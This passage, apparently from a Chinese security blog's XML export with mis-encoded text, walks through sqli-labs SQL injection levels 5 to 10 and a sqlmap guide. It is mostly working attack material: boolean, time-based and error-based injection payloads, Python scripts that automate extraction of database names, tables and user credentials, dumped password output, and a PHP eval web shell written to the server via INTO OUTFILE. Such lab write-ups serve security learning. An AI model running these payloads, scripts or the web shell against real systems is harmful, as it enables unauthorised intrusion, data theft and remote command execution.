num_mid): num = num_max if not re.findall(r&apos;You are in&apos;,requests.get(url + payload % num_min).text): num = num_min #print &apos;find num = %d&apos; % num return num payload_new = payload % num_mid finalurl = url + payload_new #print finalurl r = requests.get(finalurl) html = r.text result = re.findall(r&apos;You are in&apos;,html) if result: num_min = num_mid + 1 elif not result: num_max = num_mid #èŽ·å–å½“å‰æ•°æ®åº“å def getCurrentDBName(): payload_len = &apos;sqli-labs/Less-8/?id=1\&apos;and length((select database())) &gt; %d %%23 &apos; print &apos;èŽ·å–æ•°æ®åº“åé•¿åº¦&apos; DBNameLen = getDataLen(url,payload_len,1,50) print &apos;DBNameLen: %s&apos; % DBNameLen print &apos;èŽ·å–æ•°æ®åº“å&apos; payloadstart = &apos;sqli-labs/Less-8/?id=1\&apos; and ascii(substr((select database()),%d,1))&apos; payloadend = &apos;&gt; %s %%23&apos; DBName = &apos;&apos; for i in range(1,DBNameLen+1): payload1 = payloadstart % i payload2 = payload1 + payloadend ascii_s = getDataLen(url,payload2,0,128) DBName += chr(ascii_s) print &apos;DBName: %s&apos; % DBName #èŽ·å–æ•°æ®åº“ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ•°æ®åº“å def getAllDBName(): payload_start = &apos;sqli-labs/Less-8/?id=1\&apos; and &apos; payload_select = &apos;select schema_name from information_schema.schemata limit %d,1&apos; payload_ascii1 = &apos; ascii(substr((%s)&apos; payload_ascii2 = &apos;,%d,1))&apos; payload_end = &apos;&gt; %s %%23&apos; DBNameLen = [] for i in range(0,10):#æ­¤å¤„é»˜è®¤ç³»ç»Ÿä¸­æœ€å¤šæœ‰åä¸ªæ•°æ®åº“ payload_selecti = payload_select % i payload_lengthi = &apos;length((%s))&apos; % payload_selecti payload_end = &apos;&gt; %s %%23&apos; payload = payload_start + payload_lengthi + payload_end #print payload DBNameLen.append(getDataLen(url,payload,0,50)) print &apos;ç³»ç»Ÿä¸­å„ä¸ªæ•°æ®åº“çš„é•¿åº¦&apos; print DBNameLen #DBNameLen = [18, 10, 5, 18, 8, 4, 0, 0, 0, 0] DBName = [] for i in range(0,len(DBNameLen)): print &apos;èŽ·å–ç¬¬%dä¸ªæ•°æ®åº“å&apos; % i payload_selecti = payload_select % i DBNames = &apos;&apos; for j in range(1,DBNameLen[i]+1): payload_ascii1j = payload_ascii1 % payload_selecti payload_ascii2j = payload_ascii2 % j payload = payload_start + payload_ascii1j + payload_ascii2j + payload_end ascii_s = getDataLen(url,payload,0,128) DBNames += chr(ascii_s) print DBNames DBName.append(DBNames) print DBName #èŽ·å–æŸä¸ªæ•°æ®åº“çš„æ‰€æœ‰è¡¨å #èŽ·å–æŸä¸ªè¡¨çš„æ‰€æœ‰çš„åˆ—å #èŽ·å–æŸä¸ªåˆ—çš„æ‰€æœ‰å€¼ if __name__ == &apos;__main__&apos;: getCurrentDBName() getAllDBName() ç»“æžœï¼š èŽ·å–æ•°æ®åº“åé•¿åº¦ DBNameLen: 8 èŽ·å–æ•°æ®åº“å DBName: security ç³»ç»Ÿä¸­å„ä¸ªæ•°æ®åº“çš„é•¿åº¦ [18, 10, 5, 18, 8, 4, 0, 0, 0, 0] èŽ·å–ç¬¬0ä¸ªæ•°æ®åº“å information_schema èŽ·å–ç¬¬1ä¸ªæ•°æ®åº“å challenges èŽ·å–ç¬¬2ä¸ªæ•°æ®åº“å mysql èŽ·å–ç¬¬3ä¸ªæ•°æ®åº“å performance_schema èŽ·å–ç¬¬4ä¸ªæ•°æ®åº“å security èŽ·å–ç¬¬5ä¸ªæ•°æ®åº“å test èŽ·å–ç¬¬6ä¸ªæ•°æ®åº“å èŽ·å–ç¬¬7ä¸ªæ•°æ®åº“å èŽ·å–ç¬¬8ä¸ªæ•°æ®åº“å èŽ·å–ç¬¬9ä¸ªæ•°æ®åº“å [&apos;information_schema&apos;, &apos;challenges&apos;, &apos;mysql&apos;, &apos;performance_schema&apos;, &apos;security&apos;, &apos;test&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;] åœ¨è¿™é‡Œåªå†™äº†çˆ†ç ´å½“å‰æ•°æ®åº“åå’Œçˆ†ç ´ç³»ç»Ÿä¸­æ‰€æœ‰æ•°æ®åº“åçš„éƒ¨åˆ†ï¼ŒåŽé¢çš„è¡¨å’Œåˆ—çš„éƒ¨åˆ†ç±»ä¼¼ Less-9 GET-Time base-Single Quotesæ—¶é—´åž‹å•å¼•å·getç›²æ³¨æ—¶é—´åž‹å’Œå¸ƒå°”åž‹çš„åŒºåˆ«åœ¨äºŽï¼šæ—¶é—´åž‹æ— è®ºè¾“å…¥æ˜¯å¦åˆæ³•ï¼Œè¿”å›žçš„é¡µé¢æ˜¯ç›¸åŒçš„ï¼ŒæŸ¥çœ‹æºä»£ç ç¡®å®žå¦‚æ­¤ï¼š &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_GET[&apos;id&apos;])) { $id=$_GET[&apos;id&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;); fclose($fp); // connectivity $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; } } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} ?&gt; æ—¶é—´åž‹ç›²æ³¨ å‡½æ•° ä½œç”¨ sleep() å»¶æ—¶æ‰§è¡Œï¼ŒMySQL 5 benchmark() å»¶æ—¶æ‰§è¡Œï¼ŒMySQL 4/5 åˆ¤æ–­æ˜¯å¦ä¸ºæ—¶é—´åž‹ç›²æ³¨sqli-labs/Less-9/?id=1&apos; and sleep(5) %23 æˆ– sqli-labs/Less-9/?id=1&apos; and if(1=1,sleep(5),null) %23 æ‰§è¡ŒåŽå»¶è¿Ÿäº†å¤§æ¦‚5ç§’å·¦å³æ‰è¿”å›žï¼Œå¯è¿›è¡Œæ—¶é—´åž‹ç›²æ³¨ payloadçŒœè§£å½“å‰æ•°æ®åº“ sqli-labs/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))=115, 0,sleep(5)) å‰©ä¸‹çš„payloadæž„é€ ä¸ŽLess-8ç±»ä¼¼ Less-10 GET-Time based - double quotesæ—¶é—´åž‹åŒå¼•å·getç›²æ³¨è¿™é‡Œåªè¦æŠŠLess-9çš„å•å¼•å·æ”¹ä¸ºåŒå¼•å·å³å¯]]></content>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
        <tag>sqli-labs</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-5-7]]></title>
    <url>%2F2018%2F04%2F20%2Fsqli-labs-Less-5-6%2F</url>
    <content type="text"><![CDATA[Less-5 GET- Double Query-Single Quotes -StringåŸºäºŽgetè¯·æ±‚çš„åŒæŸ¥è¯¢çš„å•å¼•å·å­—ç¬¦åž‹æ³¨å…¥ä»€ä¹ˆå«åŒæŸ¥è¯¢ï¼ŸåŒæŸ¥è¯¢åˆå¯ä»¥å«åšåµŒå¥—å­æŸ¥è¯¢ï¼Œç›¸å½“äºŽåœ¨selectè¯­å¥ä¸­è¿˜æœ‰ä¸€ä¸ªselectè¯­å¥ï¼Œè€Œé‡Œé¢çš„selectè¯­å¥ç§°ä¸ºå­æŸ¥è¯¢ select(select) åŒæŸ¥è¯¢ä½ æ³¨å…¥å½“åœ¨ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œæ¯”å¦‚countå‡½æ•°åŽé¢å¦‚æžœä½¿ç”¨åˆ†ç»„è¯­å¥å°±ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ã€‚ å‡½æ•° åŠŸèƒ½ count(*) ç»Ÿè®¡è¡¨ä¸­æ‰€æœ‰è®°å½•çš„ä¸ªæ•° count(åˆ—å) ç»Ÿè®¡ä¸€åˆ—ä¸­å€¼çš„ä¸ªæ•°ï¼Œå…¶ä¸­é‡å¤çš„è®°å½•ä¹Ÿä¼šè¢«å½“åšæœ‰æ•ˆçš„è®°å½•ã€‚ count(distinct åˆ—å) ç»Ÿè®¡ä¸€åˆ—ä¸­å€¼çš„ä¸ªæ•°ï¼Œå…¶ä¸­é‡å¤çš„è®°å½•åªä¼šè¢«è®°å½•ä¸€æ¬¡ã€‚ sum(åˆ—å) è®¡ç®—ä¸€åˆ—å€¼çš„æ€»å’Œã€‚ avg(åˆ—å) è®¡ç®—ä¸€åˆ—å€¼çš„å¹³å‡å€¼ã€‚ max(åˆ—å) è®¡ç®—ä¸€åˆ—å€¼ä¸­çš„æœ€å¤§å€¼ã€‚ min(åˆ—å) è®¡ç®—ä¸€åˆ—å€¼ä¸­çš„æœ€å°å€¼ã€‚ rand() ç”Ÿæˆ0-1ä¹‹é—´çš„å°æ•°éšæœºå€¼ floor() åªè¿”å›žæ•´æ•°éƒ¨åˆ†ï¼Œå°æ•°éƒ¨åˆ†èˆå¼ƒ round() å‡½æ•°å››èˆäº”å…¥ï¼Œå¤§äºŽ0.5çš„éƒ¨åˆ†è¿›ä½ï¼Œä¸åˆ°åˆ™èˆå¼ƒ concat() è¿žæŽ¥å‡½æ•°ï¼Œå¯ä»¥è¿žæŽ¥å¤šä¸ªå­—ç¬¦ group by å°†ç»“æžœä»¥åˆ†ç»„çš„å½¢å¼è¿”å›ž ä»€ä¹ˆæ—¶å€™ä½¿ç”¨åŒæŸ¥è¯¢æ³¨å…¥ï¼Ÿé€‚ç”¨äºŽæ³¨å…¥æ—¶æ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä½†æ˜¯åœ¨æœ‰æ˜¾ç¤ºä½çš„æ—¶å€™åŒæ ·é€‚ç”¨ï¼Œæœ‰æ˜¾ç¤ºä½æ—¶ä¸å»ºè®®ã€‚åŒæŸ¥è¯¢æ³¨å…¥è¯­å¥çš„å›ºå®šæ ¼å¼ union select 1 from (select+count(*),concat(floor(rand(0)*2),( æ³¨å…¥çˆ†æ•°æ®è¯­å¥))a from information_schema.tables group by a)b æµ‹è¯•sqli-labs/Less-5/?id=1 è¿”å›žå¦‚ä¸‹ï¼Œä¸Žä¹‹å‰ä¸åŒ Welcome Dhakkan You are in........... æž„é€ payloadselect count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a; åˆ†æžï¼š0x3a è¡¨ç¤ºå†’å·ï¼Œrand()2 è¿”å›ž 0-2ä¹‹é—´çš„éšæœºæ•°ï¼Œfloor(rand()2)è¿”å›žæ•´æ•°0æˆ–1ã€‚ concat()å°†è¿”å›ž ::å…³é”®ä¿¡æ¯::0æˆ–è€…::å…³é”®ä¿¡æ¯::1 å­—æ®µæ•°sqli-labs/Less-5/?id=1&apos; order by 6 %23 è¿”å›žé”™è¯¯ sqli-labs/Less-5/?id=1&apos; order by 5%23 è¿”å›žæ­£ç¡® æ•°æ®åº“åŸºæœ¬ä¿¡æ¯sqli-labs/Less-5/?id=1&apos; union select 1,2,3,count(*) ,concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a%23 è¿”å›ž Welcome Dhakkan Duplicate entry &apos;::security::1&apos; for key &apos;group_key&apos; å½“å‰æ•°æ®åº“å sqli-labs/Less-5/?id=1&apos; union select 1,2,3,count(*) ,concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a%23 ç‰ˆæœ¬å· Duplicate entry &apos;::5.5.53::0&apos; for key &apos;group_key&apos; è¯»å–ä¿¡æ¯æ•°æ®åº“å(æ”¹å˜ limit 1,1çš„å€¼èŽ·å–æ‰€æœ‰çš„)sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select schema_name from information_schema.schemata limit 1,1) )a from information_schema.tables group by a)b %23 è¡¨åsqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1) )a from information_schema.columns group by a)b %23 åˆ—åsqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1) )a from information_schema.columns group by a)b %23 æ•°æ®sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select password from security.users limit 0,1) )a from information_schema.columns group by a)b %23 python å°è„šæœ¬ç”¨æ¥çˆ†ç ´(limitå¤ªéº»çƒ¦)#!/usr/bin/python #-*-encoding:utf-8-*- import requests import re url = &quot;http://192.168.83.134/sqli-labs/Less-5/&quot; #èŽ·å–æ•°æ® def getData(url,payload,file_name): files = open(file_name,&apos;a&apos;) #print url+payload r = requests.get(url+payload) html = r.text #print html data = re.findall(r&apos;::\w{0,20}::&apos;,html) for i in data: files.write(i) files.close() #èŽ·å–æ‰€æœ‰æ•°æ®åº“å def getDatabaseName(): filename = &apos;file_databasename.txt&apos; for i in range(0,20): payload_databases = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,( select schema_name from information_schema.schemata limit %s,1),0x3a,0x3a,floor(rand(0)*2) )a from information_schema.tables group by a)b %%23&apos; % i getData(url,payload_databases,filename) #èŽ·å–æŸä¸ªæ•°æ®åº“çš„æ‰€æœ‰è¡¨å def getTableName(databasename): filename = &apos;file_tablename.txt&apos; for i in range(0,20): payload_tables = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=%s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (databasename, i) getData(url,payload_tables,filename) #èŽ·å–æŸä¸ªè¡¨ä¸­çš„æ‰€æœ‰å­—æ®µå def getColumnName(tablename): filename = &apos;file_columnname.txt&apos; for i in range(0,20): payload_columns = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name= %s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (tablename,i) getData(url,payload_columns,filename) #èŽ·å–æŸä¸ªè¡¨ä¸­çš„æ•°æ® def getColumnData(databasename,tablename,columnname): filename = columnname+&apos;_data.txt&apos; for i in range(0,20): payload_columndata = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,(select %s from %s.%s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (columnname,databasename,tablename,i) getData(url,payload_columndata,filename) if __name__ == &apos;__main__&apos;: #èŽ·å–æ•°æ®åº“ä¸­æ‰€æœ‰çš„æ•°æ®åº“å print &apos;èŽ·å–æ•°æ®åº“ä¸­æ‰€æœ‰æ•°æ®åº“å&apos; getDatabaseName() #èŽ·å–securityæ•°æ®åº“çš„æ‰€æœ‰è¡¨ print &apos;èŽ·å–securityæ•°æ®åº“çš„æ‰€æœ‰è¡¨&apos; databasename = &quot;&apos;security&apos;&quot; getTableName(databasename) #èŽ·å–è¡¨ä¸­çš„å­—æ®µå print &apos;èŽ·å–usersè¡¨çš„æ‰€æœ‰å­—æ®µå&apos; tablename = &quot;&apos;users&apos;&quot; getColumnName(tablename) #èŽ·å–usersè¡¨çš„usernameå’Œpassword print &apos;èŽ·å–usersè¡¨çš„username&apos; databasename = &apos;security&apos; tablename = &apos;users&apos; columnname = &apos;username&apos; getColumnData(databasename,tablename,columnname) è¾“å‡ºå››ä¸ªæ–‡æœ¬ï¼šfile_columnname.txt file_databasename.txt file_tablename.txt cat file_databasename.txt file_tablename.txt file_columnname.txt username_data.txt ::information_schema::::challenges::::mysql::::performance_schema::::security::::test:: ::emails::::referers::::uagents::::users:: ::id::::username::::password::::first_name::::last_name:: ::Dumb::::Angelina::::Dummy::::secure::::stupid::::superman::::batman::::admin::::admin1::::admin2::::admin3::::dhakkan::::admin4:: æœ‰äº›åœ°æ–¹è¿˜æ˜¯ä½¿ç”¨äº†ç¡¬ç¼–ç ä¸å¤Ÿçµæ´»ï¼Œä½¿ç”¨burpsuitçš„intructæ¨¡å—çˆ†ç ´æ›´å¿« Less-6 GET- Double Query-Double Quotes -StringåŸºäºŽgetæ–¹æ³•è¯·æ±‚çš„åŒå¼•å·åŒæŸ¥è¯¢å­—ç¬¦æ³¨å…¥Less-6ä¸ŽLess-5åŸºæœ¬ä¸€è‡´ï¼Œåªè¦æŠ¥å•å¼•å·æ”¹ä¸ºåŒå¼•å·å³å¯ï¼Œä¸å†èµ˜è¿°ã€‚GET-Dump into outfile - StringåŸºäºŽgetæ–¹æ³•çš„å¯¼å‡ºæ–‡ä»¶çš„å­—ç¬¦åž‹æ³¨å…¥mysqlå¯¼å‡ºæ•°æ®çš„æ–¹æ³•select ... into outfile &apos;filename&apos; selectå¯ä»¥æŠŠè¢«é€‰æ‹©çš„è¡Œå†™å…¥ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶è¢«åˆ›å»ºåˆ°æœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå› æ­¤å¿…é¡»æ‹¥æœ‰fileæƒé™ï¼›è¾“å‡ºä¸èƒ½æ˜¯ä¸€ä¸ªå·²å­˜åœ¨çš„æ–‡ä»¶ï¼Œé˜²æ­¢æ–‡ä»¶æ•°æ®è¢«ç¯¡æ”¹ï¼›åœ¨unixä¸­è¯¥æ–‡ä»¶è¢«åˆ›å»ºåŽæ˜¯å¯è¯»çš„ï¼Œæƒé™æœ‰MySQLæœåŠ¡å™¨æ‰€æœ‰ï¼Œåªèƒ½è¯»ä¸èƒ½åˆ é™¤ã€‚ æºç åˆ†æž$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in.... Use outfile......&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;; echo &apos;You have an error in your SQL syntax&apos;; //print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; } } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} å‚æ•°idè¢«å•å¼•å·å’ŒåŒå±‚æ‹¬å·åŒ…è£¹ï¼Œæ­£ç¡®æ—¶æ˜¾ç¤º You are inâ€¦. Use outfileâ€¦.. é”™è¯¯æ—¶æ˜¾ç¤º You have an error in your SQL syntax; æž„é€ payloadsqli-labs/Less-7/?id=1&apos;)) %23 sqli-labs/Less-7/?id=1&apos;)) order by 6%23 è¿”å›žé”™è¯¯ sqli-labs/Less-7/?id=1&apos;)) order by 5%23 è¿”å›žæ­£å¸¸ è¯»å†™æƒé™æµ‹è¯•sqli-labs/Less-7/?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23 è¿”å›žæ­£å¸¸ï¼Œè¯´æ˜Žå…·æœ‰è¯»å†™æƒé™ æ•°æ®åº“è·¯å¾„å’Œå®‰è£…è·¯å¾„ä½¿ç”¨Less-5æˆ–Less-6çš„åŒæŸ¥è¯¢æ³¨å…¥æ–¹æ³•å‘çŽ°ä¸èµ·ä½œç”¨å¯¹æ¯”äº†æºä»£ç åŽæ‰çŸ¥é“åœ¨Less-7ä¸­æŠŠæŠ¥é”™æ˜¾ç¤ºæ³¨é‡ŠæŽ‰äº†ã€‚ //print_r(mysql_error()); æœ¬æ¥ä½¿ç”¨ @@basedir å’Œ @@datadiræ¥æŸ¥è¯¢å®‰è£…è·¯å¾„å’Œæ•°æ®åº“è·¯å¾„è¿™é‡ŒæŸ¥è¯¢ä¸äº†ï¼Œæ€»ä¹‹å‰çš„å…³å¡å¯çŸ¥ C:/phpStudy/MySQL/å’ŒC:\phpStudy\MySQL\data\æŽ¨æµ‹å‡ºç›®å½•è·¯å¾„ä¸ºC:\phpStudy\WWW\sqli-labs\Less-7\ è¿™é‡Œåœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­æŠŠæŠ¥é”™çš„æ³¨é‡ŠåŽ»æŽ‰äº†ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªMysqlé…ç½®é—®é¢˜ --secure-file-priv option so it cannot execute this statement åœ¨MySQLçš„ç›®å½•ä¸‹çš„ä¸€ä¸ªmy.iniçš„æ–‡ä»¶ä¸­æ·»åŠ secure_file_priv = è·¯å¾„é‡å¯åŽæ‰§è¡ŒæˆåŠŸ sqli-labs/Less-7/?id=1&apos;)) union select 1,2,version(),4,5 into outfile &quot;C:/phpStudy/WWW/sqli-labs/Less-7/1.txt&quot; %23 ç›´æŽ¥è®¿é—® http://192.168.83.134/sqli-labs/Less-7/1.txt å¯ä»¥çœ‹åˆ°ä¹‹å‰å†™çš„æ•°æ®ï¼Œè¯•ç€å†™å…¥ä¸€å¥è¯ sqli-labs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&apos;,4,5 into outfile &quot;C:/phpStudy/WWW/sqli-labs/Less-7/shell.php&quot; %23 å†™å…¥æˆåŠŸåŽï¼Œèƒ½å¤Ÿç›´æŽ¥è®¿é—®ï¼Œä½¿ç”¨ä¸­å›½èœåˆ€ç›´æŽ¥è¿žæŽ¥å³å¯ å‚è€ƒï¼šã€ç§‘æ™®æ–‡ã€‘åŒæŸ¥è¯¢æ³¨å…¥ Double SQL Injection(åŒæŸ¥è¯¢æ³¨å…¥)]]></content>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
        <tag>sqli-labs</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmapä½¿ç”¨æŒ‡å—]]></title>
    <url>%2F2018%2F04%2F19%2Fsqlmap%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[ä½¿ç”¨sqli-labsç»ƒä¹ ç¤¾åŒºsqlmapï¼ˆmysqlï¼‰ æ¼æ´žæºä»£ç ä¸‹è½½ï¼šhttps://github.com/Audi-1/sqli-labs å·¥å…·æ³¨å…¥(sqlmap)ç®€å•æ¼”ç¤ºç®€å•æµ‹è¯• (-u url)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --level 3 [*] starting at 15:33:02 [15:33:02] [INFO] resuming back-end DBMS &apos;mysql&apos; [15:33:02] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=1&apos; AND 1906=1906-- PKiX Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=1&apos; AND (SELECT 6992 FROM(SELECT COUNT(*),CONCAT(0x7162786271,(SELECT (ELT(6992=6992,1))),0x7162766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yOBo Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1&apos; AND SLEEP(5)-- PmIF Type: UNION query Title: Generic UNION query (NULL) - 5 columns Payload: id=-3918&apos; UNION ALL SELECT NULL,CONCAT(0x7162786271,0x58716e444643434d644b55716c6477776464456e4673725a4b65444771624356436a56647a76586b,0x7162766a71),NULL,NULL,NULL-- eMQX --- [15:33:03] [INFO] the back-end DBMS is MySQL web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 æ³¨ï¼š-v(â€“level) 3 åŒæ—¶æ˜¾ç¤ºæ³¨å…¥çš„payload åˆ—å‡ºæ•°æ®åº“ç³»ç»Ÿçš„æ•°æ®åº“(â€“dbs)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dbs web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [14:51:37] [INFO] fetching database names [14:51:38] [INFO] the SQL query used returns 6 entries [14:51:39] [INFO] retrieved: information_schema [14:51:41] [INFO] retrieved: challenges [14:51:42] [INFO] retrieved: mysql [14:51:43] [INFO] retrieved: performance_schema [14:51:44] [INFO] retrieved: security [14:51:45] [INFO] retrieved: test available databases [6]: [*] challenges [*] information_schema [*] mysql [*] performance_schema [*] security [*] test åˆ—å‡ºæ•°æ®åº“è¡¨(â€“tables -D æ•°æ®åº“åï¼Œè‹¥æ— -Då‚æ•°åˆ™æ˜¾ç¤ºæ•°æ®åº“ä¸­æ‰€æœ‰è¡¨)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --tables -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:03:02] [INFO] fetching tables for database: &apos;security&apos; [15:03:03] [INFO] the SQL query used returns 4 entries [15:03:04] [INFO] retrieved: emails [15:03:05] [INFO] retrieved: referers [15:03:06] [INFO] retrieved: uagents [15:03:07] [INFO] retrieved: users Database: security [4 tables] +----------+ | emails | | referers | | uagents | | users | +----------+ åˆ—å‡ºæ•°æ®åº“ä¸­çš„åˆ—(â€“column -T è¡¨å -D æ•°æ®åº“å è‹¥æ— -Då‚æ•°åˆ™é»˜è®¤å½“å‰æ•°æ®åº“)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --column -T &apos;users&apos; -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:08:34] [INFO] fetching columns for table &apos;users&apos; in database &apos;security&apos; [15:08:36] [INFO] the SQL query used returns 5 entries [15:08:37] [INFO] retrieved: &quot;id&quot;,&quot;int(3)&quot; [15:08:38] [INFO] retrieved: &quot;username&quot;,&quot;varchar(20)&quot; [15:08:39] [INFO] retrieved: &quot;password&quot;,&quot;varchar(20)&quot; [15:08:40] [INFO] retrieved: &quot;first_name&quot;,&quot;varchar(8)&quot; [15:08:41] [INFO] retrieved: &quot;last_name&quot;,&quot;varchar(8)&quot; Database: security Table: users [5 columns] +------------+-------------+ | Column | Type | +------------+-------------+ | first_name | varchar(8) | | id | int(3) | | last_name | varchar(8) | | password | varchar(20) | | username | varchar(20) | +------------+-------------+ èŽ·å–æ•´æŸå¼ è¡¨çš„ä¿¡æ¯(â€“dump -C column1ï¼Œcolumn2 -T tablename -D databasename )sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dump -C &apos;username&apos;,&apos;password&apos; -T &apos;users&apos; -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:19:18] [INFO] fetching entries of column(s) &apos;password, username&apos; for table &apos;users&apos; in database &apos;security&apos; [15:19:18] [INFO] the SQL query used returns 13 entries [15:19:19] [INFO] retrieved: &quot;Dumb&quot;,&quot;Dumb&quot; [15:19:20] [INFO] retrieved: &quot;I-kill-you&quot;,&quot;Angelina&quot; [15:19:21] [INFO] retrieved: &quot;p@ssword&quot;,&quot;Dummy&quot; [15:19:22] [INFO] retrieved: &quot;crappy&quot;,&quot;secure&quot; [15:19:23] [INFO] retrieved: &quot;stupidity&quot;,&quot;stupid&quot; [15:19:24] [INFO] retrieved: &quot;genious&quot;,&quot;superman&quot; [15:19:25] [INFO] retrieved: &quot;mob!le&quot;,&quot;batman&quot; [15:19:26] [INFO] retrieved: &quot;admin&quot;,&quot;admin&quot; [15:19:27] [INFO] retrieved: &quot;admin1&quot;,&quot;admin1&quot; [15:19:29] [INFO] retrieved: &quot;admin2&quot;,&quot;admin2&quot; [15:19:30] [INFO] retrieved: &quot;admin3&quot;,&quot;admin3&quot; [15:19:31] [INFO] retrieved: &quot;dumbo&quot;,&quot;dhakkan&quot; [15:19:32] [INFO] retrieved: &quot;admin4&quot;,&quot;admin4&quot; [15:19:32] [INFO] analyzing table dump for possible password hashes Database: security Table: users [13 entries] +----------+------------+ | username | password | +----------+------------+ | Dumb | Dumb | | Angelina | I-kill-you | | Dummy | p@ssword | | secure | crappy | | stupid | stupidity | | superman | genious | | batman | mob!le | | admin | admin | | admin1 | admin1 | | admin2 | admin2 | | admin3 | admin3 | | dhakkan | dumbo | | admin4 | admin4 | +----------+------------+ sqlmapä½¿ç”¨è¯­æ³•å¤§å…¨1. åŸºç¡€ç”¨æ³•ï¼š./sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 â€“dbs // åˆ—ä¸¾æ•°æ®åº“ ./sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 â€“current-db // å½“å‰æ•°æ®åº“ ./sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 â€“users // åˆ—æ•°æ®åº“ç”¨æˆ· ./sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 